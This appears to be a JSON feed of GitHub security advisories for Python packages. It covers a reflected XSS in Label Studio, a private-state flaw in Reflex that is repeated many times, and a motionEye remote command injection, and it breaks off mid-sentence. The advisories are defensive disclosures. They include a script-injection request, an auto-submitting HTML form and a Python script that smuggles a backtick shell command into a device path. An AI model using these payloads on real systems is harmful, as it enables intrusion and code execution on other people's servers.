{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The vulnerability allows an attacker to inject a malicious script into the context of a web page, which can lead to data theft, unauthorized actions on behalf of the user, and other attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability is reproducible when sending a properly formatted request to the <code>POST /projects/upload-example/</code> endpoint. In the source code, the vulnerability is located at <code>label_studio/projects/views.py</code>.</p>\n<pre><code class=\"language-python\">39: @require_http_methods(['POST'])\n40: def upload_example_using_config(request):\n41:     \"\"\"Generate upload data example by config only\"\"\"\n42:     config = request.POST.get('label_config', '')\n43: \n44:     org_pk = get_organization_from_request(request)\n45:     secure_mode = False\n46:     if org_pk is not None:\n47:         org = generics.get_object_or_404(Organization, pk=org_pk)\n48:         secure_mode = org.secure_mode\n49: \n50:     try:\n51:         Project.validate_label_config(config)\n52:         task_data, _, _ = get_sample_task(config, secure_mode)\n53:         task_data = playground_replacements(request, task_data)\n54:     except (ValueError, ValidationError, lxml.etree.Error):\n55:         response = HttpResponse('error while example generating', status=status.HTTP_400_BAD_REQUEST)\n56:     else:\n57:         response = HttpResponse(json.dumps(task_data))\n58:     return response\n</code></pre>\n<p>The vulnerability is specifically located in line 57, where HttpResponse is used.</p>\n<pre><code class=\"language-python\">57:         response = HttpResponse(json.dumps(task_data))\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Send the following request after changing the <code>{host}</code> to your own.</p>\n<pre><code class=\"language-css\">POST /projects/upload-example/ HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\n\nlabel_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%3bscript%26gt%3balert(1)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n</code></pre>\n<p>Or you can create a vulnerable HTML page by changing <code>{domain}</code> beforehand, which can later be sent to the victim.</p>\n<pre><code class=\"language-html\">&lt;html&gt;\n  &lt;body&gt;\n    &lt;form action=\"http://{domain}/projects/upload-example/\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"label&amp;#95;config\" value=\"&amp;lt;View&amp;gt;&amp;lt;Text&amp;#32;name&amp;#61;&amp;quot;text&amp;quot;&amp;#32;value&amp;#61;&amp;quot;&amp;#36;textjmwwi&amp;amp;lt&amp;#59;script&amp;amp;gt&amp;#59;alert&amp;#40;1&amp;#41;&amp;amp;lt&amp;#59;&amp;#47;script&amp;amp;gt&amp;#59;s8m37&amp;quot;&amp;#47;&amp;gt;&amp;lt;&amp;#47;View&amp;gt;\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Malicious code execution: The user may be forced to perform unwanted actions within their Label Studio account. This includes accessing <code>document.cookie</code>, but note that Label Studio session cookies are marked http-only, mitigating any possibility of session theft.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47783\">https://nvd.nist.gov/vuln/detail/CVE-2025-47783</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d\">https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jhr-wpcm-hh4h\">https://github.com/advisories/GHSA-8jhr-wpcm-hh4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h",
            "title": "[label-studio] label-studio vulnerable to Cross-Site Scripting (Reflected) via the label_config parameter.",
            "date_modified": "2025-05-15T16:21:17.000Z",
            "date_published": "2025-05-15T16:21:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using a constructed (camera) device path with the <code>config/add</code>/<code>add_camera</code> motionEye web API allows an attacker with motionEye admin user credentials to execute any UNIX shell code within a non-interactive shell as executing user of the motionEye instance, <code>motion</code> by default.</p>\n<h4 id=\"function-call-stack\">function call stack</h4>\n<ol>\n<li><code>post</code></li>\n<li><code>add_camera</code></li>\n<li><code>config.add_camera</code></li>\n<li><code>v4l2ctl.list_resolutions</code></li>\n<li><code>utils.call_subprocess</code></li>\n<li><code>subprocess.run</code></li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"build\">build</h4>\n<pre><code class=\"language-sh\">RUN_USER=\"user\"\nRUN_UID=$(id -u ${RUN_USER})\nRUN_GID=$(id -g ${RUN_USER})\nTIMESTAMP=\"$(date '+%Y%m%d-%H%M')\"\n\ndocker build \\\n  --network host \\\n  --build-arg=\"RUN_UID=${RUN_UID?}\" \\\n  --build-arg=\"RUN_GID=${RUN_GID?}\" \\\n  -t \"${USER?}/motioneye:${TIMESTAMP}\" \\\n  --no-cache \\\n  -f docker/Dockerfile .\n</code></pre>\n<h4 id=\"reproduce\">reproduce</h4>\n<p>Run:</p>\n<pre><code class=\"language-sh\">docker run --rm  -d   -p 8765:8765   --hostname=\"motioneye\"   -v /etc/localtime:/etc/localtime:ro   -v /tmp/motioneyeconfig:/etc/motioneye   -v /tmp/motioneyeconfig:/var/lib/motioneye\n</code></pre>\n<pre><code class=\"language-console\">bash-4.2$ docker logs ceb435eacf55 -f\nconfigure_logging cmd motioneye: False\nconfigure logging to file: None\n    INFO: hello! this is motionEye server 0.43.1b3\n   DEBUG: found motion executable \"/usr/bin/motion\" version \"4.7.0\"\n   DEBUG: found ffmpeg executable \"/usr/bin/ffmpeg\" version \"7.1.1-1+b1\"\n   DEBUG: listing config dir /etc/motioneye...\n   DEBUG: found camera with id 1\n   DEBUG: reading camera config from /etc/motioneye/camera-1.conf...\n   DEBUG: loading additional config structure for camera, without separators\n   DEBUG: Using selector: EpollSelector\n   DEBUG: searching motion executable\n   DEBUG: starting motion executable \"/usr/bin/motion\" version \"4.7.0\"\n    INFO: cleanup started\n    INFO: wsswitch started\n    INFO: tasks started\n    INFO: mjpg customer garbage collector has started\n    INFO: server started\n</code></pre>\n<p>Now, run the following script to attack motionEye:</p>\n<pre><code class=\"language-python\">import requests\nimport json\n\nurl = \"http://your_ip:8765/config/add?_username=admin&amp;_signature=c22baef3399cb7328e22ded1ca68395b4daecd18\"\n\npayload = json.dumps({\n  \"proto\": \"v4l2\",\n  \"path\": \"' `touch /tmp/bbbb` '\"\n})\nheaders = {\n  'Content-Type': 'application/json'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nprint(response.text)\n</code></pre>\n<img src=\"https://github.com/user-attachments/assets/8e0a9bfe-8de3-4023-96d6-0e888bfe3c62\" alt=\"Image\" width=\"1187\">\n\n<img src=\"https://github.com/user-attachments/assets/04c73349-694a-4531-993e-eea765b87d0e\" alt=\"Image\" width=\"324\">\n\n<h4 id=\"discussion\">Discussion</h4>\n<p>It is obvious that call_subprocess was used to execute the incoming data, resulting in a vulnerability</p>\n<pre><code class=\"language-python\">def list_resolutions(device):\n    from motioneye import motionctl\n\n    device = utils.make_str(device)\n\n    if device in _resolutions_cache:\n        return _resolutions_cache[device]\n\n    logging.debug(f'listing resolutions of device {device}...')\n\n    resolutions = set()\n    output = b''\n    started = time.time()\n    cmd = f\"v4l2-ctl -d '{device}' --list-formats-ext | grep -vi stepwise | grep -oE '[0-9]+x[0-9]+' || true\"\n    logging.debug(f'running command \"{cmd}\"')\n\n    try:\n        output = utils.call_subprocess(cmd, shell=True, stderr=utils.DEV_NULL)\n    except:\n        logging.error(f'failed to list resolutions of device \"{device}\"')\n\n    output = utils.make_str(output)\n\ndef call_subprocess(\n    args,\n    stdin=None,\n    input=None,\n    stdout=subprocess.PIPE,\n    stderr=DEV_NULL,\n    capture_output=False,\n    shell=False,\n    cwd=None,\n    timeout=None,\n    check=True,\n    encoding='utf-8',\n    errors=None,\n    text=None,\n    env=None,\n) -&gt; str:\n    \"\"\"subprocess.run wrapper to return output as a decoded string\"\"\"\n    return subprocess.run(\n        args,\n        stdin=stdin,\n        input=input,\n        stdout=stdout,\n        stderr=stderr,\n        capture_output=capture_output,\n        shell=shell,\n        cwd=cwd,\n        timeout=timeout,\n        check=check,\n        encoding=encoding,\n        errors=errors,\n        text=text,\n        env=env,\n    ).stdout.strip()\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>RCE</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patch with motionEye v0.43.1b4: <a href=\"https://github.com/motioneye-project/motioneye/pull/3143\">https://github.com/motioneye-project/motioneye/pull/3143</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Applying the following patch, replacing the literal single quotes in the created <code>cmd</code> string with a <code>shlex.quote</code>d input device: <a 